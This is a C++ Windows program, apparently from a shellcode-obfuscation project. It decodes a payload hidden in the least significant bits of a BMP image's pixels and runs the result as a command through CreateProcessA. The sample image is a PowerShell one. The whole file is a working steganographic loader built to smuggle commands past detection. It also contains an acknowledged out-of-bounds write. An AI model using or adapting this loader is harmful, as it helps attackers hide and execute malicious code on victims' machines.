#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <gdiplus.h>
#include <iostream>
#pragma comment(lib,"gdiplus.lib")

using namespace Gdiplus;


char get_lsb(char target, char source) {
    return (target << 1) | (source & 1);
}



const int shellcode_len = 45896;
char* payload_data = new char[shellcode_len / 8];



void read_image(LPCWSTR filename) {

    // Init Gdiplus
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // load image
    Gdiplus::Bitmap bmp(filename);

    Color c;
    char channels[3];

    int length = shellcode_len;
    int pos = 0;

    for (int i = 0; i < bmp.GetHeight(); i++) {
        for (int j = 0; j < bmp.GetWidth(); j++) {
            
            bmp.GetPixel(j, i, &c);
            
            channels[0] = c.GetR();
            channels[1] = c.GetG();
            channels[2] = c.GetB();

            for (int k = 0; k < 3; k++) {
                if (length <= 0) {
                    // need to fix this
                    payload_data[(shellcode_len / 8)] = 0;
                    return;
                }

                payload_data[pos / 8] = get_lsb(payload_data[pos / 8], channels[k]);
                pos++;
                length--;
            }
        }
    }
    GdiplusShutdown(gdiplusToken);
}


void run() {
    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(STARTUPINFOA));
    PROCESS_INFORMATION pi;

    printf_s("%s", payload_data);
    CreateProcessA(
        NULL,
        payload_data,
        NULL,
        NULL,
        FALSE,
        NULL,
        NULL,
        NULL,
        &si,
        &pi
    );
    Sleep(3000);
}


int main() {
    read_image(L"C:\\Users\\Blackberry\\Desktop\\projects\\yet-another-shellcode-obfuscator\\samples\\cmd\\powershell.bmp");
    run();

    return 0;
}